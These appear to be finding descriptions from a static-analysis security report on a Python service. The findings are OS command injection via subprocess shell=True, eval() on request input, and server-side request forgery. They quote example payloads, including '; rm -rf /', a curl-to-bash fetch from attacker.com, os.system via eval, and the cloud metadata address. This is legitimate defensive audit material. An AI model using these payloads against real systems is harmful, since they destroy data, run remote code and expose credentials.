shortDescription.text: OS command injection via subprocess.run with shell=True

fullDescription.text: Attacker-controlled input is passed directly to subprocess.run() with shell=True, enabling arbitrary OS command execution. Shell metacharacters (;, |, &&, ||, $()) are interpreted, allowing command chaining and substitution.

shortDescription.text: Arbitrary code execution via eval() on untrusted input

fullDescription.text: User-supplied input from HTTP request body is passed directly to Python's eval() function without any validation, sanitization, or sandboxing. This allows execution of arbitrary Python code on the server.

shortDescription.text: Server-side request forgery via unvalidated URL in requests.get

fullDescription.text: User-controlled URL is passed to requests.get() without validation of the target host or scheme, allowing attackers to access internal services, cloud metadata endpoints, or other restricted resources.

message.text: OS command injection: The 'command' field from the JSON request body is passed directly to subprocess.run() with shell=True at line 186. No input validation, sanitization, or command whitelisting is applied. An attacker can execute arbitrary OS commands by injecting shell metacharacters (e.g., '; rm -rf /', '| curl attacker.com/shell.sh | bash').

par-analysis.action: No input validation, no sanitization, no allowlist, no sandboxing

message.text: Arbitrary code execution: User-supplied 'code' parameter from JSON request body is passed directly to Python eval() without any validation or sandboxing. An attacker can execute arbitrary Python code, including __import__('os').system('...') for OS-level access.

par-analysis.action: No input validation, no AST restriction, no sandboxing

message.text: Server-side request forgery: User-controlled URL is passed to requests.get() without host/scheme validation. Attackers can probe internal services (e.g., http://169.254.169.254/latest/meta-data/ for cloud metadata), access localhost-bound services, or perform port scanning of internal networks.

par-analysis.action: No URL scheme/host validation, no allowlist, no egress filtering
par-analysis.resource: HTTP client (requests.get) with server-side network access
